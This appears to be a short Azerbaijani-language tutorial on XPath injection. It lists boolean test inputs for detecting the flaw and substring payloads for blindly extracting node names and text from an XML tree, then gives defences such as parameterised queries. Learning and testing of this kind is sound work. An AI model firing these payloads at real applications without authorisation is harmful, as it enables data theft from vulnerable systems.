# XPath Injection

## 1. XPath Injection Nədir?
XPath Injection, tətbiqin istifadəçi tərəfindən daxil edilən məlumatları təhlükəsiz şəkildə emal etməməsi nəticəsində XML verilənlər bazasına qeyri-qanuni giriş əldə etmək üçün istifadə olunan hücum növüdür. Bu hücumda hücumçu, XPath ifadələrini manipulyasiya edərək tətbiqin məntiqini dəyişdirə və məxfi məlumatlara çıxış əldə edə bilər.

## 2. XPath Injection Zəifliyini Aşkar Etmək

### 2.1. Diferensial Davranış Testi
Aşağıdakı test girişlərini tətbiqə daxil et və tətbiqin davranışında fərqlilik olub-olmadığını yoxla:
```sql
‘ or count(parent::*[position()=1])=0 or ‘a’=’b
‘ or count(parent::*[position()=1])>0 or ‘a’=’b
```
- Əgər bu girişlər tətbiqin fərqli cavablar qaytarmasına səbəb olursa və xəta vermirsə, tətbiq XPath Injection hücumuna həssas ola bilər.

### 2.2. Rəqəmsal Parametrlərin Test Edilməsi
Əgər test edilən parametr rəqəmsəldirsə, aşağıdakı dəyərləri daxil et və nəticələri müşahidə et:
```sql
1 or count(parent::*[position()=1])=0
1 or count(parent::*[position()=1])>0
```
- Əgər bu girişlərdən hər hansı biri tətbiqin cavablarını fərqli edirsə, XPath Injection mümkündür.

### 2.3. XML Ağacından Məlumat Çıxarma
Əgər tətbiq XPath Injection-a qarşı həssasdırsa, bu üsulla XML strukturundan məlumat çıxarmaq mümkündür.

- Cari node-un parent adını çıxarmaq üçün aşağıdakı şərtləri yoxla:
```sql
substring(name(parent::*[position()=1]),1,1)=’a’
```
- Bütün XML ağacındakı məlumatları çıxarmaq üçün isə aşağıdakı üsulu istifadə et:
```sql
substring(//parentnodename[position()=1]/child::node()[position()=1]/text(),1,1)=’a’
```
Bu üsullardan istifadə edərək, XML verilənlər bazasından məlumat çıxarmaq mümkün ola bilər.

## 3. Təhlükəsizlik Tədbirləri
- İstifadəçi girişlərini düzgün şəkildə yoxlamaq və təmizləmək lazımdır.
- XPath ifadələrində istifadəçi tərəfindən daxil edilən məlumatları birbaşa istifadə etmək əvəzinə, parametrli sorğulardan istifadə etmək tövsiyə olunur.
- XML verilənlər bazasına giriş məhdudlaşdırılmalı və lazımsız məlumatların qaytarılması qarşısı alınmalıdır.

